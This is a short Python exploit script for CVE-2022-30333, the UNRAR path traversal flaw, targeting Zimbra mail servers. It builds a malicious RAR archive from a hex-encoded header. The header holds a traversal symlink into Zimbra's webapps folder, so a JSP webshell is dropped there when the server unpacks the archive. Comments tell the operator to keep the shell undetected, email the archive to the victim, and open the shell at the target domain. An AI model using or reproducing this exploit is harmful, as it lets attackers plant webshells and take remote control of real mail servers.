import os, sys, subprocess, binascii, time


# CVE-2022-30333 Zimbra UNRAR vulnerability. Unrar till V 6.11 vulnerable. Make sure your .jsp shell is undetected. This exploit will work on zimbra installed on default path.
# Place your webshell in folder root_ver. And then rar the root_ver folder. Not ZIP, only rar. Then  python CVE-2022-30333.py root_ver.rar output.rar. Output.rar is the file you need to send.
# It can take few minutes for the shell to be extracted, or sometimes email is delivered late. 
# Your shell will be extracted at domain.com/yourshellname.jsp

portnam= ("526172211A0701003392B5E50A010506000501018080008328785E820102036A000400A0080000"
"000080000008726F6F745F7665720A030257578B179793D8015E0502005A2E2E5C2E2E5C2E2E5C"
"2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C"
"2E2E5C2E2E5c6F70742F7A696D6272612F6A657474795F626173652F776562617070732F7A696D"
"627261")

print ("Usage: " + sys.argv[0] + " root_ver.rar " + "output.rar\r\n\r\n" ) 

symlinkhead = bytearray(binascii.unhexlify(portnam))

    
file = sys.argv[1]
f = open(file,mode='rb')
print "[+] Finding the valid offset for input rar ... \r\n\r\n"
time.sleep(2)
buff = f.read()
db2 = (buff.index(b"\x72\x6f\x6f\x74\x5f") - 22 )
print "[+] Valid input rar offset is " , (db2) , "\r\n\r\n"
f.seek (db2)
buff2 = f.read()
f.close()

timg = bytearray((buff2))

time.sleep(2)

print "[+] Generating the malicoius archive... \r\n\r\n"


time.sleep(2)

file = sys.argv[2]
f = open(file,mode='wb')
f.write(symlinkhead+timg)
f.close()
print ("[+] Generated the rar successfully")